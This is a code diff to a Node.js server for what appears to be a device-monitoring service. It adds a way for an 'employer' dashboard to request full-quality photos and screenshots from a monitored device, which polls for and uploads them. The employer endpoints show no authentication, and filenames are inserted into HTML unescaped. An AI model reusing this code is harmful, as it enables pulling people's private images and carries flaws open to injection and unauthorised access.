@@ -95,6 +95,17 @@ const NotificationSchema = new mongoose.Schema({
     received_at: Date
 });
 
+const DownloadRequestSchema = new mongoose.Schema({
+    token: String,
+    filename: String,
+    image_id: String,
+    status: { type: String, default: 'pending' }, // pending, uploaded, downloaded
+    full_image: String, // base64 full quality
+    requested_at: { type: Date, default: Date.now }
+});
+
+const DownloadRequest = mongoose.model('DownloadRequest', DownloadRequestSchema);
+
 const Employer = mongoose.model('Employer', EmployerSchema);
 const Token = mongoose.model('Token', TokenSchema);
 const Device = mongoose.model('Device', DeviceSchema);
@@ -754,14 +765,19 @@ app.get('/device', async (req, res) => {
             <div class="card" style="padding:0">
                 ${media.length === 0 ? '<p class="no-data">No media files</p>' : `
                 <table>
-                    <tr><th>Preview</th><th>Filename</th><th>Type</th><th>Size</th><th>Date</th></tr>
-                    ${media.map(m => `<tr>
-                        <td>${m.thumbnail ? `<img class="thumb" src="data:image/jpeg;base64,${m.thumbnail}"/>` : 'No preview'}</td>
-                        <td>${m.filename}</td>
-                        <td>${m.is_screenshot ? '📸 Screenshot' : '🖼️ Photo'}</td>
-                        <td>${Math.round(m.size_bytes / 1024)}KB</td>
-                        <td>${new Date(m.date_taken).toLocaleString()}</td>
-                    </tr>`).join('')}
+                   <tr><th>Preview</th><th>Filename</th><th>Type</th><th>Size</th><th>Date</th><th>Action</th></tr>
+                  ${media.map(m => `<tr>
+  			  <td>${m.thumbnail ? `<img class="thumb" src="data:image/jpeg;base64,${m.thumbnail}"/>` : 'No preview'}</td>
+    			  <td>${m.filename}</td>
+  			  <td>${m.is_screenshot ? '📸 Screenshot' : '🖼️ Photo'}</td>
+    			  <td>${Math.round(m.size_bytes / 1024)}KB</td>
+   			  <td>${new Date(m.date_taken).toLocaleString()}</td>
+   			  <td>
+    			       <button class="btn btn-sm btn-primary" onclick="requestDownload('${token}','${m.filename}','${m._id}')">
+          			Download Full
+       				</button>
+  			  </td>
+		   </tr>`).join('')}
                 </table>`}
             </div>
         </div>
@@ -793,8 +809,99 @@ app.get('/device', async (req, res) => {
             document.getElementById('tab-' + name).classList.add('active');
             event.target.classList.add('active');
         }
+
+async function requestDownload(token, filename, image_id) {
+    const btn = event.target;
+    btn.textContent = 'Requesting...';
+    btn.disabled = true;
+    
+    const res = await fetch('/employer/request-download', {
+        method: 'POST', headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({ token, filename, image_id })
+    });
+    const data = await res.json();
+    
+    if (data.success) {
+        btn.textContent = 'Waiting for device...';
+        // Poll every 10 seconds for the upload
+        const interval = setInterval(async () => {
+            const dlRes = await fetch('/employer/download-full', {
+                method: 'POST', headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ token, filename })
+            });
+            const dlData = await dlRes.json();
+            if (dlData.success) {
+                clearInterval(interval);
+                // Auto download
+                const link = document.createElement('a');
+                link.href = 'data:image/jpeg;base64,' + dlData.image;
+                link.download = filename;
+                link.click();
+                btn.textContent = 'Downloaded ✅';
+            }
+        }, 10000);
+    }
+}
     </script>
     </body></html>`);
+});
+
+// Employer requests full image download
+app.post('/employer/request-download', async (req, res) => {
+    try {
+        const { token, filename, image_id } = req.body;
+        const existing = await DownloadRequest.findOne({ token, filename, status: 'pending' });
+        if (existing) return res.json({ success: true, message: 'Already requested' });
+        await DownloadRequest.create({ token, filename, image_id });
+        res.json({ success: true });
+    } catch (e) {
+        res.json({ success: false, message: e.message });
+    }
+});
+
+// Device polls for pending download requests
+app.get('/device/download-requests', async (req, res) => {
+    try {
+        const token = getToken(req);
+        const requests = await DownloadRequest.find({ token, status: 'pending' });
+        res.json({ success: true, requests });
+    } catch (e) {
+        res.json({ success: false, message: e.message });
+    }
+});
+
+// Device uploads full quality image
+app.post('/device/upload-full', async (req, res) => {
+    try {
+        const token = getToken(req);
+        const { filename, full_image } = req.body;
+        await DownloadRequest.findOneAndUpdate(
+            { token, filename },
+            { full_image, status: 'uploaded' }
+        );
+        console.log(`Full image uploaded: ${filename} from ${token}`);
+        res.json({ success: true });
+    } catch (e) {
+        res.json({ success: false, message: e.message });
+    }
+});
+
+// Employer downloads full image then clears it
+app.post('/employer/download-full', async (req, res) => {
+    try {
+        const { token, filename } = req.body;
+        const request = await DownloadRequest.findOne({ token, filename, status: 'uploaded' });
+        if (!request) return res.json({ success: false, message: 'Image not ready yet' });
+        const image = request.full_image;
+        // Delete full image after download to save storage
+        await DownloadRequest.findOneAndUpdate(
+            { token, filename },
+            { full_image: null, status: 'downloaded' }
+        );
+        res.json({ success: true, image });
+    } catch (e) {
+        res.json({ success: false, message: e.message });
+    }
 });
 
 app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
